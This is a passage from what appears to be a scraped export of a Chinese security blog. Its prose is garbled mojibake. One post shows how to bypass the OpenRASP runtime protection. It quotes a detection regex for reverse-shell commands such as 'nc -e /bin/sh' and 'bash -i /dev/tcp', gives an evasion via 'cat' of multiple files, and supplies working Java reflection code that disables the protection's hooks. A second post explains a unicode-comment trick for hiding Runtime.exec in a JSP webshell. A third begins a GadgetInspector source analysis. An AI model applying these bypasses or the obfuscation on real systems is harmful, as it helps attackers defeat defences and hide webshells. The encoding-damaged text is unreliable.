&gt; 0) &#123; envList.add(envItem); &#125; index = i; &#125; &#125; &#125; checkCommand((List)commands, (List)envList); &#125; &#125; ä¹‹ååœ¨è®²å‘½ä»¤å’Œç¯å¢ƒå˜é‡æ”¾åˆ°commandsä¸envListå½“ä¸­å¹¶æ‰§è¡ŒcheckCommand((List)commands, (List)envList);ï¼Œè¿™é‡Œä¼šæŠŠæ‰§è¡Œçš„å‘½ä»¤ã€ç¯å¢ƒå˜é‡ã€ä»¥åŠå½“å‰è°ƒç”¨æ ˆå­˜æ”¾åˆ°paramsè¿™ä¸ªå˜é‡å½“ä¸­ ä¹‹åå¸¦ç€è¿™äº›å‚æ•°æ‰§è¡ŒHookHandler.doCheckWithoutRequest,è¿™é‡Œçœç•¥ä¸€äº›åºŸè¯ ä¹‹ååœ¨com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest ä¼šé€‰æ‹©åˆé€‚çš„checkerå»æ£€æŸ¥æˆ‘ä»¬æ‰§è¡Œçš„ä¸œè¥¿ 123public static boolean check(Type type, CheckParameter parameter) &#123; return ((Checker)checkers.get(type)).check(parameter);&#125; ç»§ç»­çœç•¥ä¸€å †åºŸè¯ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ°V8.check æˆ‘ä»¬æ¥çœ‹çœ‹å¯¹åº”çš„cæºç ï¼Œè¿™é‡Œå¿½ç•¥å‰é¢éƒ¨åˆ†ï¼Œåé¢è¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒéªšçš„v8çš„å‡½æ•°SetLazyDataProperty å‡½æ•°å¯¹åº”çš„Getteræ˜¯GetStackï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°é‡Œé¢æ¯”è¾ƒæ ¸å¿ƒçš„æ“ä½œå°±æ˜¯é€šè¿‡JNIENVå»è°ƒç”¨Javaçš„com.baidu.openrasp.v8.V8#GetStackå‡½æ•°å¾ˆéªš 123456789101112131415161718void GetStack(v8::Local&lt;v8::Name&gt; name, const v8::PropertyCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; auto isolate = reinterpret_cast&lt;openrasp_v8::Isolate*&gt;(info.GetIsolate()); auto env = GetJNIEnv(isolate); jbyteArray jbuf = reinterpret_cast&lt;jbyteArray&gt;(env-&gt;CallStaticObjectMethod(v8_class.cls, v8_class.GetStack)); if (jbuf == nullptr) &#123; return info.GetReturnValue().Set(v8::Array::New(isolate)); &#125; auto maybe_string = v8::String::NewExternalOneByte(isolate, new ExternalOneByteStringResource(env, jbuf)); if (maybe_string.IsEmpty()) &#123; return info.GetReturnValue().Set(v8::Array::New(isolate)); &#125; auto maybe_value = v8::JSON::Parse(isolate-&gt;GetCurrentContext(), maybe_string.ToLocalChecked()); if (maybe_value.IsEmpty()) &#123; return info.GetReturnValue().Set(v8::Array::New(isolate)); &#125; auto value = maybe_value.ToLocalChecked(); info.GetReturnValue().Set(value);&#125; ç»§ç»­å¾€ä¸‹çœ‹checkå‡½æ•°ï¼Œç”±äºæˆ‘ä»¬è¿™é‡Œåˆ†æçš„æ˜¯commandï¼Œæ‰€ä»¥iféƒ¨åˆ†æš‚æ—¶ä¸ç”¨çœ‹ï¼Œä¹‹åè°ƒç”¨isolate-&gt;Checkå»æ‰§è¡Œæ£€æµ‹(ä¸æˆªå›¾äº†ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ‰¾åˆ°å¯¹åº”çš„æ³¨å†Œçš„æ£€æµ‹å‡½æ•°å»è°ƒç”¨) å¦‚ä½•ç»•è¿‡ç»•è¿‡çš„æ–¹å¼å…¶å®çœŸçš„æœ‰å¾ˆå¤šï¼Œè¿™é‡Œç®€å•è°ˆå‡ ä¸ª åŸºäºæ­£åˆ™çš„ç»•è¿‡é¦–å…ˆå¯¹äºè§„åˆ™çš„æ£€æµ‹æ—¢ç„¶æ˜¯åŸºäºæ­£åˆ™è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆå¾ˆæ˜¾ç„¶å¦‚æœåœ¨è§„åˆ™ä¸å¤Ÿå®Œå–„çš„æƒ…å†µä¹‹ä¸‹ï¼Œé‚£ä¹Ÿæ˜¯å¯ä»¥é€ æˆä¸€éƒ¨åˆ†çš„ç»•è¿‡ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨å®˜æ–¹çš„æ’ä»¶å½“ä¸­ï¼Œæˆ‘ä»¬å°±æ‹¿è¿™ç¬¬ä¸€ä¸ªæŸ¥çœ‹æ–‡ä»¶çš„å‘½ä»¤æ¥è¯´åªæ˜¯ä»»æ„åŒ¹é…1-5ä½ï¼Œè™½ç„¶ä¸èƒ½é€šè¿‡å¤šä¸ªç©ºæ ¼ä¹‹ç±»çš„ç»•è¿‡ 12345command_common: &#123; name: &#x27;ç®—æ³•3 - è¯†åˆ«å¸¸ç”¨æ¸—é€å‘½ä»¤ï¼ˆæ¢é’ˆï¼‰&#x27;, action: &#x27;log&#x27;, pattern: &#x27;cat.&#123;1,5&#125;/etc/passwd|nc.&#123;1,30&#125;-e.&#123;1,100&#125;/bin/(?:ba)?sh|bash\\\\s-.&#123;0,4&#125;i.&#123;1,20&#125;/dev/tcp/|subprocess.call\\\\(.&#123;0,6&#125;/bin/(?:ba)?sh|fsockopen\\\\(.&#123;1,50&#125;/bin/(?:ba)?sh|perl.&#123;1,80&#125;socket.&#123;1,120&#125;open.&#123;1,80&#125;exec\\\\(.&#123;1,5&#125;/bin/(?:ba)?sh&#x27;&#125;, æˆ‘ä»¬çš„catå‡½æ•°æ”¯æŒåŒæ—¶è¯»å¤šä¸ªæ–‡ä»¶cat /abc/def /etc/passwdï¼Œè¿™æ ·ä¹Ÿæ˜¯å¯ä»¥è½»è½»æ¾æ¾å¾—ä»¥è¿›è¡Œç»•è¿‡ é€šè¿‡ä¿®æ”¹æŸäº›å±æ€§é€šå¸¸å¦‚æœå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæˆ‘ä»¬é€šå¸¸å¯ä»¥é€šè¿‡TemplatesImplå»åŠ è½½ä»»æ„å­—èŠ‚ç ï¼Œåœ¨è¿™é‡Œå¦‚æœå¯¹äºåœ¨RASPæ‰§è¡Œæ£€æµ‹è¿‡ç¨‹å½“ä¸­å¦‚æœå­˜åœ¨æŸäº›å…³é”®é…ç½®æˆ‘ä»¬å¯ä»¥æ“æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¼è‡´ç»•è¿‡ï¼Œè€ŒOpenRaspé‡Œé¢å°±æœ‰ï¼Œæ¯”å¦‚åœ¨æ‰§è¡Œæ£€æµ‹å‰ä¸­é—´çš„è°ƒç”¨æµç¨‹æœ‰ä¸ªcom.baidu.openrasp.HookHandler#doCheckWithoutRequestï¼Œè¿™é‡Œé¢æåˆ°äº†å¦‚æœæœåŠ¡å™¨çš„cpuä½¿ç”¨ç‡è¶…è¿‡90%ï¼Œç¦ç”¨å…¨éƒ¨hookç‚¹ åˆæˆ–è€…æ»¡è¶³å½“äº‘æ§æ³¨å†ŒæˆåŠŸä¹‹å‰ï¼Œä¸è¿›å…¥ä»»ä½•hookç‚¹ï¼Œåæ­£è¿™äº›æˆ‘ä»¬ä¸éƒ½æ˜¯å¯ä»¥é€šè¿‡åå°„å»è®¾ç½®çš„ä¹ˆï¼Œè¿™é‡Œæˆ‘å°±éšä¾¿æ¥ä¸€ä¸ªï¼Œå°±ä»¥ç¬¬ä¸€ä¸ªä¸ºä¾‹å­å§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„è·å–è¿™ä¸ªå·²ç»å®ä¾‹åŒ–çš„å®ä¾‹ï¼Œåœ¨è¿™ä¸ªåŸºç¡€ä¸Šä¿®æ”¹disableHooksè¿™ä¸ªå±æ€§å³å¯ ä»£ç ç¤ºä¾‹å¦‚ä¸‹ 123456789try &#123; Class&lt;?&gt; clz = Thread.currentThread().getContextClassLoader().loadClass(&quot;com.baidu.openrasp.config.Config&quot;); java.lang.reflect.Method getConfig = clz.getDeclaredMethod(&quot;getConfig&quot;); java.lang.reflect.Field disableHooks = clz.getDeclaredField(&quot;disableHooks&quot;); disableHooks.setAccessible(true); Object ins = getConfig.invoke(null); disableHooks.set(ins,true);&#125; catch (Exception e) &#123;&#125; ä¸ºäº†å¾—åˆ°ç›´è§‚çš„æ•ˆæœæˆ‘æŠŠæ’ä»¶å½“ä¸­çš„logæ”¹ä¸ºblockæ¥æ¼”ç¤ºä¸‹ 12345// å‘½ä»¤æ³¨å…¥ - å¸¸è§å‘½ä»¤command_common: &#123; name: &#x27;ç®—æ³•3 - è¯†åˆ«å¸¸ç”¨æ¸—é€å‘½ä»¤ï¼ˆæ¢é’ˆï¼‰&#x27;, action: &#x27;block&#x27;, pattern: &#x27;cat.&#123;1,5&#125;/etc/passwd|nc.&#123;1,30&#125;-e.&#123;1,100&#125;/bin/(?:ba)?sh|bash\\\\s-.&#123;0,4&#125;i.&#123;1,20&#125;/dev/tcp/|subprocess.call\\\\(.&#123;0,6&#125;/bin/(?:ba)?sh|fsockopen\\\\(.&#123;1,50&#125;/bin/(?:ba)?sh|perl.&#123;1,80&#125;socket.&#123;1,120&#125;open.&#123;1,80&#125;exec\\\\(.&#123;1,5&#125;/bin/(?:ba)?sh|\\\\&#123;echo,.&#123;10,400&#125;&#123;base64,-d&#125;&#x27;&#125; å¹¶ç®€å•å†™äº†ä¸ªæ§åˆ¶å™¨æ¨¡æ‹Ÿååºåˆ—åŒ–è¿‡ç¨‹ï¼ˆä¸€ä¸ªå­—æ‡’ï¼‰ 123456789101112@RequestMapping(&quot;/off&quot;)public void off()&#123; try &#123; Class&lt;?&gt; clz = Thread.currentThread().getContextClassLoader().loadClass(&quot;com.baidu.openrasp.config.Config&quot;); java.lang.reflect.Method getConfig = clz.getDeclaredMethod(&quot;getConfig&quot;); java.lang.reflect.Field disableHooks = clz.getDeclaredField(&quot;disableHooks&quot;); disableHooks.setAccessible(true); Object ins = getConfig.invoke(null); disableHooks.set(ins,true); &#125; catch (Exception e) &#123;&#125;&#125; é¦–å…ˆæ‰§è¡Œå‘½ä»¤è¿”å›å¯çˆ±å°æé¾™ å½“æˆ‘è®¿é—®offè·¯ç”±æˆåŠŸå…³é—­raspçš„hookåŠŸèƒ½ å½“ç„¶ä½ å¯èƒ½ä¼šè¯´è¿˜æœ‰å…¶ä»–çš„å…³é—­çš„hookç‚¹ï¼Œæ¯”å¦‚åˆšåˆšä¸Šé¢æåˆ°çš„doCheckWithoutRequestå®é™…ä¸Šæœ€ç»ˆæ˜¯é€šè¿‡doRealCheckWithoutRequestå»è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œä½†æ¯•ç«Ÿä¹Ÿæ˜¯ç±»ä¼¼çš„æ„æ€å°±ä¸å¤šè€ƒè™‘è¿™äº›æ›´æ”¹å±æ€§çš„äº†ç‚¹åˆ°ä¸ºæ­¢ï¼Œæ¯•ç«Ÿåªè¦ç ´åä¸­é—´ä»»ä¸€ç¯èŠ‚å³å¯ è¦†ç›–æ’ä»¶æˆ‘ä»¬çŸ¥é“OpenRASPé€šè¿‡InitFileWatcher,ä¸€æ—¦å…¶ä¸­çš„jsæ–‡ä»¶è¢«åˆ›å»ºã€æ”¹å˜ã€åˆ é™¤éƒ½ä¼šè§¦å‘æ’ä»¶çš„ å¹¶ä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ’ä»¶é…ç½®å½“ä¸­å¯¹äºæ–‡ä»¶ä¸Šä¼ jsé»˜è®¤æ˜¯å…³é—­é€»è¾‘æ£€æµ‹çš„å¼€å…³ å› æ­¤æˆ‘ä»¬å¦‚æœå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ å¹¶ä¸”å¯ä»¥è·¨ç›®å½•å†å¹¶ä¸”çŸ¥é“æ’ä»¶è·¯å¾„çš„æƒ…å†µä¸‹ï¼Œè™½ç„¶ä¸æ˜¯å¾ˆé€šç”¨ä½†å¥½æ­¹ä¹Ÿæ˜¯ä¸€ä¸ªæ‰‹æ®µ è‡³äºæœ‰æ²¡æœ‰å…¶ä»–æ–¹å¼è¿™é‡Œæš‚æ—¶æˆ‘å°±ä¸æ¢ç©¶äº†ï¼Œé¡ºä¾¿åæ§½å­¦æ ¡çš„å®è®­å¤ªç´¯äº†ï¼Œå¿ƒç†ä¸Šçš„ç´¯ å‚è€ƒæ–‡ç« å®˜æ–¹æ–‡æ¡£ C++ä¸­æ„é€ å‡½æ•°çš„ä¸¤ç§å†™æ³• JNIENVä»‹ç» ä»¥OpenRASPä¸ºåŸºç¡€-å±•å¼€æ¥æ¸¯æ¸¯RASPçš„ç±»åŠ è½½","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Rasp","slug":"Rasp","permalink":"https://y4tacker.github.io/tags/Rasp/"}]},{"title":"JspWebShellæ–°å§¿åŠ¿è§£è¯»","slug":"year/2022/5/JspWebShellæ–°å§¿åŠ¿è§£è¯»","date":"2022-05-16T15:23:07.000Z","updated":"2024-08-04T09:01:49.364Z","comments":true,"path":"2022/05/16/year/2022/5/JspWebShellæ–°å§¿åŠ¿è§£è¯»/","link":"","permalink":"https://y4tacker.github.io/2022/05/16/year/2022/5/JspWebShell%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E8%AF%BB/","excerpt":"","text":"JspWebShellæ–°å§¿åŠ¿è§£è¯»å†™åœ¨å‰é¢â€‹ åˆšåˆšæ— æ„é—´å‘ç°æˆ‘yzddmr6å‘äº†ç¯‡æ–°æ–‡ç« ï¼Œé‡Œé¢æåˆ°äº†ä¸€ä¸ªjspwebshellçš„æ–°å§¿åŠ¿ï¼Œä½†æ˜¯æ²¡æœ‰å…·ä½“åˆ†æï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘å°±æ¥ç€æ¥åˆ†æä¸€æ³¢ é¦–å…ˆä»£ç é•¿è¿™æ · 12345&lt;% Runtime.getRuntime(). //\\u000d\\uabcdexec(&quot;open -na Calculator&quot;);%&gt; æ­£æ–‡å¦‚æœæŒ‰ç…§ä¼ ç»ŸJavaçš„javacçš„æ–¹å¼ç¼–è¯‘è¿™æ ·ä¸€å®šæ˜¯ä¼šå‡ºé”™çš„ï¼Œè¿™é‡Œä¸è´´å›¾è‡ªå·±è¯•è¯•ï¼Œè€Œjspä¸åŒäºæ™®é€šçš„javaç¨‹åºï¼Œjspæ˜¯æœ‰è‡ªå·±çš„å¯¹ç±»ç¼–è¯‘æ—¶çš„å®ç°æœºåˆ¶,å…¶ç¼–è¯‘ç±»çš„æ—¶å€™æœ€ç»ˆæ˜¯åœ¨org.apache.jasper.compiler.JDTCompiler#generateClassç”Ÿæˆæˆ‘ä»¬çš„classæ–‡ä»¶(çœç•¥ä¸­é€”çš„å¾ˆå¤šæ­¥éª¤ç›´æ£é»„é¾™ï¼Œä¸ç„¶è®²ç€ä¹Ÿè´¹åŠ²) è¿™æ˜¯è°ƒç”¨æ ˆï¼Œæœ‰å…´è¶£å¯ä»¥æ·±å…¥åˆ†æ 12345678910111213141516171819202122232425262728293031323334353637383940414243getNextToken0:1482, Scanner (org.eclipse.jdt.internal.compiler.parser)getNextToken:1462, Scanner (org.eclipse.jdt.internal.compiler.parser)fetchNextToken:12999, Parser (org.eclipse.jdt.internal.compiler.parser)parse:12891, Parser (org.eclipse.jdt.internal.compiler.parser)parse:13277, Parser (org.eclipse.jdt.internal.compiler.parser)parseStatements:225, MethodDeclaration (org.eclipse.jdt.internal.compiler.ast)parseMethods:1152, TypeDeclaration (org.eclipse.jdt.internal.compiler.ast)getMethodBodies:11941, Parser (org.eclipse.jdt.internal.compiler.parser)process:888, Compiler (org.eclipse.jdt.internal.compiler)processCompiledUnits:575, Compiler (org.eclipse.jdt.internal.compiler)compile:475, Compiler (org.eclipse.jdt.internal.compiler)compile:426, Compiler (org.eclipse.jdt.internal.compiler)generateClass:457, JDTCompiler (org.apache.jasper.compiler)compile:397, Compiler (org.apache.jasper.compiler)compile:367, Compiler (org.apache.jasper.compiler)compile:351, Compiler (org.apache.jasper.compiler)compile:605, JspCompilationContext (org.apache.jasper)service:399, JspServletWrapper (org.apache.jasper.servlet)serviceJspFile:379, JspServlet (org.apache.jasper.servlet)service:327, JspServlet (org.apache.jasper.servlet)service:763, HttpServlet (javax.servlet.http)internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)doFilter:53, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)invoke:197, StandardWrapperValve (org.apache.catalina.core)invoke:97, StandardContextValve (org.apache.catalina.core)invoke:540, AuthenticatorBase (org.apache.catalina.authenticator)invoke:135, StandardHostValve (org.apache.catalina.core)invoke:92, ErrorReportValve (org.apache.catalina.valves)invoke:687, AbstractAccessLogValve (org.apache.catalina.valves)invoke:78, StandardEngineValve (org.apache.catalina.core)service:357, CoyoteAdapter (org.apache.catalina.connector)service:382, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1732, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:844, Thread (java.lang) å¥½äº†ä¸æ‰¯é‚£ä¹ˆå¤šï¼Œå›åˆ°æ­£é¢˜ï¼Œåœ¨è®²ä¹‹å‰æˆ‘ä»¬éœ€è¦çŸ¥é“æœ‰ä¸ªä¸œè¥¿å«javadocç›¸ä¿¡å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰äº†å°±æ˜¯ç”¨äºæè¿°æ–¹æ³•æˆ–è€…ç±»çš„ä½œç”¨çš„ä¸œè¥¿ï¼Œè€Œé€ æˆå¯ä»¥è§£æçš„åŸå› å…¶å®å’Œè¿™ä¸ªæœ‰å…³ç³»(jspç¼–è¯‘è¿‡ç¨‹å½“ä¸­ç”¨åˆ°äº†ASTï¼Œè¿™é‡Œä¸å¤šæ‰¯) åœ¨ç”Ÿæˆæœ€ç»ˆclassçš„è¿‡ç¨‹å½“ä¸­ï¼Œå®ƒä¼šéå†æ–‡ä»¶å½“ä¸­çš„å­—ç¬¦å¹¶åšunicodeè§£ç å¤„ç†ï¼Œä¸‹å›¾å¯ä»¥çœ‹åˆ°æ­£åœ¨éå†çš„è¿‡ç¨‹ è€Œå¯¹äºunicodeçš„å¤„ç†æœ€ç»ˆåœ¨org.eclipse.jdt.internal.compiler.parser.Scanner#getNextToken0ï¼Œç®€å•çœ‹äº†çœ¼ä»£ç å…¶å®æ˜¯ä¸ºäº†è®©ASTå…¼å®¹æ³¨é‡ŠåŠŸèƒ½ï¼Œå›åˆ°ä»£ç å¦‚æœå¼€å¤´æ˜¯/ï¼Œä¹‹åä¼šåˆ¤æ–­ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯/è¿˜æ˜¯*,ä¹Ÿå°±æ˜¯å•è¡Œæˆ–è€…å¤šè¡Œæ³¨é‡Šå’¯ æ ¹æ®ä»£ç æˆ‘ä»¬è¿™é‡Œæ˜¾ç„¶lookAheadä¸º0ï¼Œå› æ­¤æˆ‘ä»¬æ¥çœ‹ifåˆ†æ”¯ï¼Œç»§ç»­å¾€ä¸‹èµ°å½“å‰ä¸º\\rå¦‚æœä¸‹ä¸€ä¸ªåˆæ˜¯unicodeç¼–ç çš„å­—ç¬¦ä¼šè¿›è¡Œunicodeè§£ç åŒæ—¶isJavadocå±æ€§ä¼šèµ‹å€¼true æ¥ç€å¾€ä¸‹æˆ‘ä»¬çš„\\uabcdæ˜¯ä¹±ç å­—ç¬¦å’Œä¸‹é¢æ¡ä»¶ä¹Ÿä¸ç¬¦åˆæ‰€ä»¥ä¹Ÿä¸ç»§ç»­èµ°äº†ç®€å•çœ‹çœ‹ä»£ç å‘—ï¼Œä¸èµ°çš„åŸå› ä¸€æ–¹é¢æ˜¯è¿™ä¸ªä¸‹ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯\\nå¦ä¸€æ–¹é¢checkNonExternalizedStringLiteralsåœ¨æˆ‘è¿™ä¸ªtomcatç‰ˆæœ¬é»˜è®¤ä¸ºfalse ä½†æ˜¯æˆ‘è¿˜æ˜¯å¥½å¥‡çš„çœ‹äº†ä¸€çœ¼parseTagså‡½æ•°ï¼Œåœ¨é‡Œé¢å¤„ç†çš„æ³¨é‡Šå‰ç¼€æ˜¯TAG_PREFIX = &quot;//$NON-NLS-&quot;.toCharArray();ï¼Œä»¥åŠIDENTITY_COMPARISON_TAG = &quot;//$IDENTITY-COMPARISON$&quot;å¾ˆç¥å¥‡ç®€å•è€ƒå¤å¯ä»¥çœ‹åˆ°https://stackoverflow.com/questions/654037/what-does-non-nls-1-meanï¼Œä»æè¿°å¯ä»¥çœ‹å‡ºä½œç”¨æ˜¯ä¸ºäº†å›½é™…åŒ–ï¼Œä½†æ›´å…·ä½“çš„å¯ä»¥çœ‹çœ‹å®˜æ–¹çš„è¿™ç¯‡æ–‡ç« äº†è§£å†™çš„å¾ˆè¯¦ç»†https://www.eclipse.org/articles/Article-Internationalization/how2I18n.html å½“ç„¶è‚¯å®šèƒ½åœ¨è¿™ä¸ªå±‚é¢ä¸Šåšæ›´å¤šçš„æ··æ·†ï¼Œæ¥ä¸‹æ¥çš„çµæ´»çš„å·¥ä½œå°±äº¤ç»™å¤§å®¶è‡ªå·±æ„é€ äº†ï¼Œæ„Ÿè°¢æˆ‘yzddmr6ï¼Œä¹‹å‰è¿˜æ²¡æƒ³åˆ°å¯ä»¥è¿™æ · ä½†æ˜¯è¿˜æ˜¯ä¸çŸ¥é“å¦‚æœé»˜è®¤å±æ€§å¼€çš„æƒ…å†µä¸‹ï¼Œä¸ºä»€ä¹ˆå‡ºç°//\\u000d\\u000aæˆ–//\\u000d\\u000då°±ä¼šåˆ¤åˆ«æ˜¯è¦å»è¯†åˆ«é‚£ä¸¤ä¸ªæ ‡ç­¾ï¼Œå¸Œæœ›æœ‰æ‡‚çš„å¸ˆå‚…è¯´è¯´","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Jsp","slug":"Jsp","permalink":"https://y4tacker.github.io/tags/Jsp/"},{"name":"Webshell","slug":"Webshell","permalink":"https://y4tacker.github.io/tags/Webshell/"}]},{"title":"GadgetInspectoræºç åˆ†æ","slug":"year/2022/5/GadgetInspectoræºç åˆ†æ","date":"2022-05-09T01:56:31.000Z","updated":"2024-08-04T09:01:49.335Z","comments":true,"path":"2022/05/09/year/2022/5/GadgetInspectoræºç åˆ†æ/","link":"","permalink":"https://y4tacker.github.io/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"GadgetInspectoræºç åˆ†æå‰ç½®åºŸè¯æˆ‘ä¸æƒ³æä»‹ç»ï¼Œå°±è¿™æ ·å§ï¼Œå†™è¿™ä¸ªä¸»è¦æ˜¯ç½‘ä¸Šçš„å¯¹æˆ‘å¾ˆæ™¦æ¶©ï¼Œå¾ˆå¤šåˆ«äººè§‰å¾—ç®€å•çš„æˆ‘ä¸ä¼šï¼ŒåŒ…æ‹¬ä¸€äº›æ±‡ç¼–æŒ‡ä»¤ç­‰ï¼Œå½“ç„¶æœ¬ç¯‡ä¹Ÿæ˜¯ç«™åœ¨å¾ˆå¤šå‰è¾ˆçš„è‚©è†€ä¸Šè¿›è¡Œå­¦ä¹ ï¼Œå±å®æ˜¯å°‘èŠ±äº†å¾ˆå¤šåŠŸå¤« åœ¨åˆ†ægadgetinspectoræºç çš„æ—¶å€™ï¼Œå¤§æ¦‚ä¼šå¯¹å„ä¸ªæ ¸å¿ƒç±»è®²è§£ï¼Œå¹¶ç®€å•åˆ†æASMéƒ¨åˆ†ï¼Œbtwæœ¬ç¯‡åŸºäºjdk8è¿›è¡Œåˆ†æ å½“ç„¶æ—¢ç„¶æ˜¯å­¦ä¹ ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šæ˜¯éœ€è¦è·Ÿè¸ªä»£ç çš„ï¼Œè€ŒGIè¿™æ¬¾å·¥å…·å±å®å¤´ç–¼ï¼Œæœ¬èº«ä¸ä»…å¼•å…¥äº†jdkçš„ä¸€äº›ä¾èµ–å¦‚rt.jarï¼Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹å½“ä¸­ä¹Ÿå‡ºç°äº†gadgetinspectorå½“ä¸­çš„ç±»ï¼Œå±å®ä¸é€‚åˆå­¦ä¹ æ—¶ä½¿ç”¨ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘åœ¨gadgetinspector.ClassResourceEnumerator#getAllClasseså½“ä¸­å°†æºç ä¿®æ”¹å¦‚æ­¤ï¼Œè¿™æ ·æˆ‘ä¾¿èƒ½è‡ªè¡Œå†™ä»£ç é€»è¾‘ï¼Œå¹¶å±•å¼€å­¦ä¹ ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºåŒ–ç¹ä¸ºç®€ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„è¿‡ç¨‹ï¼Œå¦‚ä¸‹æˆ‘å‰”é™¤äº†jdkåŸæœ¬çš„ç±»ï¼Œå¹¶ä¸”è¦æ±‚å…¨ç±»ååŒ…å«ç‰¹å®šå­—ç¬¦ï¼Œå› æ­¤è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œå½“ç„¶åœ¨å…·ä½“ä½¿ç”¨çš„æ—¶å€™è¿˜æ˜¯è¦æ›¿æ¢å›æ¥ 123456789101112public Collection&lt;ClassResource&gt; getAllClasses() throws IOException &#123; // Collection&lt;ClassResource&gt; result = new ArrayList&lt;&gt;(getRuntimeClasses()); Collection&lt;ClassResource&gt; result = new ArrayList&lt;&gt;(); if (ConfigHelper.onlyJDK) return result; for (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123; if (classInfo.getName().contains(&quot;yyds&quot;))&#123; result.add(new ClassLoaderClassResource(classLoader, classInfo.getResourceName())); &#125; &#125; return result;&#125; å¯ä»¥çœ‹åˆ°ç»è¿‡ç®€å•çš„ä¼˜åŒ–ï¼Œè¿‡ç¨‹ä¹Ÿæ›´åŠ æ¸…æ™°ï¼Œä½†æ˜¯åœ¨åé¢æœ‰äº›åœ°æ–¹éœ€è¦æ”¹å›æ¥ä¸ç„¶å¾—ä¸åˆ°æ­£ç¡®ç»“æœï¼Œè¿™é‡Œæ˜¯ä¸ºäº†åˆ†ææ‰€ä»¥æš‚æ—¶æ”¹ä¸€ä¸‹ åœ¨å­¦ä¹ çš„æ—¶å€™é…åˆåæ±‡ç¼–ä»£ç ä¼šæ›´å®¹æ˜“ç†è§£ï¼ŒJavaä¹Ÿè‡ªå¸¦äº†æŸ¥çœ‹çš„æ–¹æ³•javap -c ç±»å lolï¼Œå¤šé€¼é€¼ä¸€å¥ä¸€å®šè¦åœ¨ç†Ÿæ‚‰jvm stackå’Œæœ¬åœ°å˜é‡è¡¨ï¼Œä¸ç„¶å¾ˆå¤šé€»è¾‘ä¼šæ˜¯æ‡µçš„ ASMéƒ¨åˆ†è¿™éƒ¨åˆ†ä¸å»ºè®®ç›´æ¥çœ‹ï¼Œå»ºè®®åœ¨åé¢çœ‹åˆ°å…·ä½“éƒ¨åˆ†å†æ¥çœ‹çœ‹ æ¨¡æ‹ŸJVMæ ˆå¸§å˜åŒ–è¿™éƒ¨åˆ†å¾ˆé‡è¦å¦‚æœæä¸æ˜ç™½åé¢åœ¨çœ‹GIä»£ç çš„æ—¶å€™ä¼šå¾ˆæ‡µé€¼ åœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹éƒ½å¯¹åº”ä¸€ä¸ªå±äºè‡ªå·±çš„JVM Stackã€‚å½“ä¸€ä¸ªæ–°çº¿ç¨‹å¼€å§‹æ—¶ä¼šåœ¨å†…å­˜ä¸Šåˆ†é…ä¸€ä¸ªå±äºè‡ªå·±çš„JVM Stackï¼›å½“è¯¥çº¿ç¨‹æ‰§è¡Œç»“æŸåï¼Œç›¸åº”çš„JVM Stackå†…å­˜ç©ºé—´ä¹Ÿå°±è¢«å›æ”¶äº†ã€‚ åœ¨JVM Stackå½“ä¸­ï¼Œæ˜¯æ ˆçš„ç»“æ„ï¼Œé‡Œé¢å­˜å‚¨çš„æ˜¯framesï¼›æ¯ä¸€ä¸ªframeç©ºé—´å¯ä»¥ç§°ä¹‹ä¸ºStack Frameã€‚å½“è°ƒç”¨ä¸€ä¸ªæ–°æ–¹æ³•çš„æ—¶å€™ï¼Œå°±ä¼šåœ¨JVM Stackä¸Šåˆ†é…ä¸€ä¸ªframeç©ºé—´ï¼›å½“æ–¹æ³•é€€å‡ºæ—¶ï¼Œç›¸åº”çš„frameç©ºé—´ä¹Ÿä¼šJVM Stackä¸Šè¿›è¡Œæ¸…é™¤æ‰ï¼ˆå‡ºæ ˆæ“ä½œï¼‰ã€‚åœ¨frameç©ºé—´å½“ä¸­ï¼Œæœ‰ä¸¤ä¸ªé‡è¦çš„ç»“æ„ï¼Œå³local 